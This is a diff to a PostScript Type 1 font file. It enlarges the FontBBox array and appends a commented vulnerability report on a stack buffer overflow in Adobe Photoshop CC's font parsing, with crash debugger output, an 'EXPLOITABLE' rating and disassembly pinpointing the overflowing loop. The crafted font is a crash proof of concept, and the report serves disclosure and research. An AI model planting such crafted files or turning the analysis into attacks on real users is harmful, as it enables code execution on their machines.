@@ -51,7 +51,7 @@ dup 120 /x put
 dup 121 /y put
 dup 122 /z put
 readonly def
-/FontBBox{-32 -250 1048 750 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1}readonly def
+/FontBBox{-32 -250 1048 750 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337}readonly def
 /UniqueID 5087385 def
 currentdict end
 currentfile eexec
@@ -301,3 +301,129 @@ newpath
 
 showpage
 
+% Adobe Photoshop CC Type 1 Font FontBBox array Stack Buffer Overflow Remote Code Execution Vulnerability
+
+% Summary:
+% ========
+
+% A specially crafted postscript type 1 font file can trigger a stack buffer overflow via a crafted FontBBox array. 
+
+% Analysis:
+% =========
+
+% A large FontBBox array can overflow a stack var and lead to a stack based buffer overflow. In this example, I supplied a poc with the following:
+ 
+% /FontBBox{-32 -250 1048 750 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337 1337}readonly def
+
+% Debugging:
+% ==========
+
+% STATUS_STACK_BUFFER_OVERRUN encountered
+% (133c.850): Break instruction exception - code 80000003 (first chance)
+% *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Adobe\Adobe Photoshop CC 2018 (32 Bit)\MPS.dll - 
+% eax=00000000 ebx=503aad2c ecx=77a2e4d0 edx=002abf0d esi=00000000 edi=002ac8cc
+% eip=77a2e34d esp=002ac154 ebp=002ac1d0 iopl=0         nv up ei pl zr na pe nc
+% cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+% kernel32!UnhandledExceptionFilter+0x5f:
+% 77a2e34d cc              int     3
+
+% 0:000> kv
+%  # ChildEBP RetAddr  Args to Child              
+% 00 002ac1d0 50126724 503aad2c 002ac50c 5012682f kernel32!UnhandledExceptionFilter+0x5f (FPO: [Non-Fpo])
+% WARNING: Stack unwind information not available. Following frames may be wrong.
+% 01 002ac1dc 5012682f 503aad2c 00000012 002ac224 MPS!MPSToAGMColorSpace+0x12274
+% 02 002ac50c 502556ef 001b2493 45a2b7ec c2000000 MPS!MPSToAGMColorSpace+0x1237f
+% 03 002ac594 5012a452 00000001 01002092 459948bc MPS!MPSCT5NewServer+0x7957f
+% 04 002ac5e4 5012a6de 002ac720 00000000 002ac8cc MPS!MPSToAGMColorSpace+0x15fa2
+% 05 002ac614 5012774a 00000001 00000009 00000000 MPS!MPSToAGMColorSpace+0x1622e
+% 06 002ac64c 50352b4a 00000000 00000002 00000000 MPS!MPSToAGMColorSpace+0x1329a
+% 07 002ac680 50352855 00000003 00000002 00000002 MPS!MPSCT5NewServer+0x1769da
+% 08 002ac694 503532cf 45a0cc24 0000000c 00000000 MPS!MPSCT5NewServer+0x1766e5
+% 09 002ac708 503537a2 45a0cc24 00000010 00000010 MPS!MPSCT5NewServer+0x17715f
+% 0a 00000000 00000000 00000000 00000000 00000000 MPS!MPSCT5NewServer+0x177632
+
+% 0:000> !load msec
+% 0:000> !exploitable
+
+% !exploitable 1.6.0.0
+% Exploitability Classification: EXPLOITABLE
+% Recommended Bug Title: Exploitable - Stack Buffer Overrun (/GS Exception) starting at MPS!MPSCT5NewServer+0x000000000007957f (Hash=0xe6ea5d40.0x979b8c29)
+
+% An overrun of a protected stack buffer has been detected. This is considered exploitable, and must be fixed.
+
+% Static Analysis:
+% ================
+
+% Since the stack var comes from sub_10165500, I'm marking the bug to be in this function.
+
+% .text:10165500 sub_10165500    proc near               ; CODE XREF: sub_1012DE70+396
+% .text:10165500                                         ; sub_1012F0D0+1FC
+% .text:10165500
+% .text:10165500 var_1C          = byte ptr -1Ch
+% .text:10165500 var_14          = dword ptr -14h
+% .text:10165500 var_10          = dword ptr -10h
+% .text:10165500 var_C           = dword ptr -0Ch
+% .text:10165500 var_8           = dword ptr -8
+% .text:10165500 var_4           = dword ptr -4
+% .text:10165500 arg_0           = dword ptr  8
+% .text:10165500 arg_4           = dword ptr  0Ch
+% .text:10165500 arg_8           = dword ptr  10h
+% .text:10165500
+% .text:10165500                 push    ebp
+% .text:10165501                 mov     ebp, esp
+% .text:10165503                 sub     esp, 1Ch
+% .text:10165506                 mov     eax, ___security_cookie
+% .text:1016550B                 xor     eax, ebp
+% .text:1016550D                 mov     [ebp+var_4], eax
+% .text:10165510                 mov     ecx, [ebp+arg_8]
+% .text:10165513                 mov     edx, [ebp+arg_0]
+% .text:10165516                 push    ebx
+% .text:10165517                 push    edi
+% .text:10165518                 mov     edi, [ebp+arg_4]
+% .text:1016551B                 test    ecx, ecx
+% .text:1016551D                 jnz     loc_10165621
+% .text:10165523                 lea     eax, [ebp+var_1C]
+% .text:10165526                 push    eax
+% .text:10165527                 mov     eax, dword_10351CA8
+% .text:1016552C                 add     eax, 670h
+% .text:10165531                 push    eax
+% .text:10165532                 push    edx
+% .text:10165533                 call    sub_1021BA70
+% .text:10165538                 add     esp, 0Ch
+% .text:1016553B                 test    eax, eax
+% .text:1016553D                 jz      loc_101655F9
+% .text:10165543                 push    esi
+% .text:10165544                 lea     eax, [ebp+var_14]
+% .text:10165547                 push    eax
+% .text:10165548                 lea     eax, [ebp+var_1C]
+% .text:1016554B                 push    eax                          ; size 0x10 (4 elements expected)
+% .text:1016554C                 call    sub_1010DD40                 ; stack overflow
+
+% In sub_1010DD40, we see the following code:
+
+% .text:1010DD80 loc_1010DD80:                                        ; CODE XREF: sub_1010DD40+76
+% .text:1010DD80                 lea     eax, [ebp+var_10]
+% .text:1010DD83                 push    eax
+% .text:1010DD84                 lea     eax, [ebp+var_8]
+% .text:1010DD87                 push    eax
+% .text:1010DD88                 call    sub_10260BD0
+% .text:1010DD8D                 mov     eax, [ebp+var_10]
+% .text:1010DD90                 add     esp, 8
+% .text:1010DD93                 and     al, 0F0h
+% .text:1010DD95                 cmp     al, 10h
+% .text:1010DD97                 jnz     short loc_1010DDA3
+% .text:1010DD99                 movd    xmm0, [ebp+var_C]
+% .text:1010DD9E                 cvtdq2ps xmm0, xmm0
+% .text:1010DDA1                 jmp     short loc_1010DDA8
+% .text:1010DDA3 ; ---------------------------------------------------------------------------
+% .text:1010DDA3
+% .text:1010DDA3 loc_1010DDA3:                                        ; CODE XREF: sub_1010DD40+57
+% .text:1010DDA3                 movss   xmm0, [ebp+var_C]
+% .text:1010DDA8
+% .text:1010DDA8 loc_1010DDA8:                                        ; CODE XREF: sub_1010DD40+61
+% .text:1010DDA8                 mov     eax, [ebp+arg_4]
+% .text:1010DDAB                 inc     esi
+% .text:1010DDAC                 movss   dword ptr [eax+edi*4], xmm0  ; stack overflow right here
+% .text:1010DDB1                 movzx   edi, si                      ; edi is the counter
+% .text:1010DDB4                 cmp     edi, ebx                     ; ebx is the # of elements in the array
+% .text:1010DDB6                 jb      short loc_1010DD80           ; jump back into loop
